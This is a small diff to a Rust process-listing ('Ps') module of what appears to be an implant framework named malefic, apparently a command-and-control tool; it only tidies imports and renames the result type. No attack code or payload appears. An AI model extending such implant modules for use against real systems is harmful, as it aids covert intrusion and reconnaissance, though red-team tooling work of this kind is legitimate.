@@ -1,9 +1,6 @@
-use crate::{Module, TaskResult, check_request, Result};
-use malefic_proto::proto::implantpb::{spite::Body};
-use async_trait::async_trait;
 use malefic_proto::proto::modulepb;
 use malefic_proto::proto::modulepb::PsResponse;
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 pub struct Ps {}
 
@@ -12,8 +9,8 @@ pub struct Ps {}
 impl Module for Ps {}
 
 #[async_trait]
-impl crate::ModuleImpl for Ps {
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
+impl ModuleImpl for Ps {
+    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let _ = check_request!(receiver, Body::Request)?;
         
         let mut response = PsResponse::default();
